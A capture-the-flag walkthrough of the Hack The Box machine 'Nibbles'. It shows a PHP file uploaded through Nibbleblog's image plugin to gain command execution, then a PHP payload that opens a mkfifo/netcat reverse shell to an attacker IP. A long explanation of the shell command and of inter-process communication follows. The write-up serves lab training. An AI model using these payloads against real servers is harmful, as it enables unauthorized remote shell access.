#Nibbles - HTB Machine



In the Plugins page, it allows to upload image files. This is a potential vulnerability which can be abused to uplaod PHP files

php code: 
   `   <?php system('id'); ?>   `

_Save this code to a file and then click on the Browse button and upload it._

After upload, we get bunch of error and remember a directory under plugins which is under content 
> The full path is at http://<host>/nibbleblog/content/private/plugins/my_image/.

<img src="https://github.com/user-attachments/assets/3b0fe319-e8c9-49a3-acd3-5173f8c8b80d">

https://highon.coffee/blog/reverse-shell-cheat-sheet/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


> Breakdown of the command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f

The command `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f` is a complex series of commands typically used in the context of creating a reverse shell. Here's a detailed breakdown of what each part does:

1. **`rm /tmp/f;`**: This removes the file named `f` in the `/tmp` directory, if it exists. This ensures that the following command to create a named pipe doesn't fail due to the file already existing.

2. **`mkfifo /tmp/f;`**: This creates a named pipe (FIFO) called `f` in the `/tmp` directory. A named pipe allows for communication between processes.

3. **`cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKING IP> <LISTENING PORT> > /tmp/f`**: This is the core part of the reverse shell setup.

   - **`cat /tmp/f`**: This reads from the named pipe `/tmp/f`. The output of this command will be used as input for the next command in the pipeline.

   - **`|`**: This pipe operator takes the output of the command on its left (in this case, `cat /tmp/f`) and uses it as input for the command on its right (`/bin/sh -i`).

   - **`/bin/sh -i`**: This starts an interactive shell. The `-i` flag stands for interactive, making the shell session interactive.

   - **`2>&1`**: This redirects standard error (file descriptor 2) to standard output (file descriptor 1). This ensures that both the output and error messages from the shell are sent through the same pipe.

   - **`| nc <ATTACKING IP> <LISTENING PORT>`**: This pipe operator takes the combined output (standard output and standard error) from the shell and pipes it to `nc`. The `nc` (netcat) command establishes a connection to the specified `<ATTACKING IP>` and `<LISTENING PORT>`. This sends the shell's output to the attacker's machine.

   - **`> /tmp/f`**: This redirects the input coming from the netcat connection back into the named pipe `/tmp/f`. This completes the communication loop, allowing the attacker to send commands to the shell via the netcat connection.

### Summary

- **Removal of Existing File**: `rm /tmp/f` ensures there is no existing file named `f` in `/tmp`.
- **Creation of Named Pipe**: `mkfifo /tmp/f` creates a special file that acts as a named pipe for inter-process communication.
- **Setup of Reverse Shell**: The combination of `cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKING IP> <LISTENING PORT> > /tmp/f` creates a reverse shell:
  - `cat /tmp/f` reads from the named pipe.
  - The interactive shell (`/bin/sh -i`) executes commands received via the pipe.
  - Both standard output and standard error of the shell are sent through netcat (`nc`) to the attacker's IP and port.
  - The commands sent by the attacker are redirected into the named pipe, completing the loop.

### Security Implications

This command sequence is used to establish a reverse shell, allowing an attacker to gain remote access to the target system's shell. It is a malicious action typically employed in unauthorized access and exploitation scenarios. Executing such commands without proper authorization is illegal and unethical. It's important to use and understand such commands only in controlled environments for educational or security testing purposes, with explicit permission.

> Named Pipe (FIFO): A named pipe, also known as a FIFO (First In, First Out), is a special type of file used for inter-process communication. Unlike regular pipes, which exist only during the lifetime of the process and are used for communication between processes that have a parent-child relationship, named pipes exist as special files within the file system. This means they can be used for communication between unrelated processes.
> Creation: You create a named pipe using the mkfifo command. For example, mkfifo /tmp/f creates a named pipe named f in the /tmp directory.
> Behavior: Data written to a named pipe by one process can be read by another process. The data flow through the pipe in the order it was written (first in, first out).

  >Inter-Process Communication (IPC) refers to a set of mechanisms that allow processes to communicate with each other and synchronize their actions. These mechanisms are essential for coordination between processes in a multitasking operating system, where multiple processes may need to exchange data, share resources, or signal each other about their status.
  
  ### Common IPC Mechanisms
  
  1. **Pipes**:
     - **Anonymous Pipes**: Used for communication between parent and child processes. Data written to one end of the pipe can be read from the other end.
     - **Named Pipes (FIFOs)**: Similar to anonymous pipes but have a presence in the file system. They allow communication between unrelated processes.
  
  2. **Message Queues**:
     - A message queue is a linked list of messages stored within the kernel and identified by a message queue identifier. Processes can send messages to the queue and receive messages from the queue.
  
  3. **Shared Memory**:
     - Allows multiple processes to access the same memory space. This is the fastest form of IPC because data does not need to be copied between the processes. It requires synchronization mechanisms (like semaphores) to manage concurrent access.
  
  4. **Semaphores**:
     - Used to control access to a common resource by multiple processes to avoid critical section problems. Semaphores are variables that are used as flags to signal the status of a resource.
  
  5. **Sockets**:
     - Primarily used for communication between processes over a network. They can also be used for communication between processes on the same machine. Sockets provide a robust way to handle network communication and can be either stream-oriented (TCP) or datagram-oriented (UDP).
  
  6. **Signals**:
     - A limited form of IPC used to notify a process that a particular event has occurred. Signals can be used to interrupt a process, inform it of an error, or communicate between processes in a limited way.
  
  7. **Files**:
     - Processes can communicate by reading and writing to a common file. This is a simple form of IPC but can be inefficient due to the need for disk I/O and lack of synchronization mechanisms.
  
  8. **Memory-Mapped Files**:
     - Allows files or devices to be mapped into memory. Processes can then read and write to the file as if it were part of the process’s memory space, providing a shared memory-like interface.
  
  ### Examples and Use Cases
  
  - **Pipes and Named Pipes**: Used for simple data transfer between processes. For example, a command pipeline in a Unix shell (`ls | grep pattern`) uses anonymous pipes.
    
  - **Message Queues**: Used in scenarios where processes need to send discrete messages to each other, such as job scheduling systems.
    
  - **Shared Memory**: Commonly used in high-performance computing applications where multiple processes need to access large datasets efficiently.
    
  - **Semaphores**: Used in operating systems and real-time applications to manage resource access, such as controlling access to a printer or a database.
    
  - **Sockets**: Used for network communication between distributed applications, such as web servers and clients.
  
  ### Advantages of IPC
  
  - **Efficiency**: Some IPC mechanisms, like shared memory, provide very efficient means of data exchange.
  - **Modularity**: Allows for building modular applications where different components can communicate with each other.
  - **Concurrency**: Facilitates concurrent execution of processes, which can lead to better utilization of system resources.
  
  ### Challenges of IPC
  
  - **Synchronization**: Managing synchronization to avoid race conditions and ensure data consistency can be complex.
  - **Deadlock**: Improper use of IPC mechanisms can lead to deadlocks where processes wait indefinitely for resources.
  - **Security**: Ensuring that IPC mechanisms are used securely to prevent unauthorized access or data leaks.
  
  Overall, IPC is a fundamental concept in operating systems and application development that enables processes to work together in a coordinated manner.
------------------------------------------------------------------------------------------------------

`See the edited PHP script below.
Code: php

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
 `

 Another way to include command is in the URL rather than to create a seperate reverse php file

![Alt rev shell](https://github.com/user-attachments/assets/b8d5e3e0-6a0f-4a8f-8d13-517ddfdef9f6 "Alternate way to create command reverse shell")

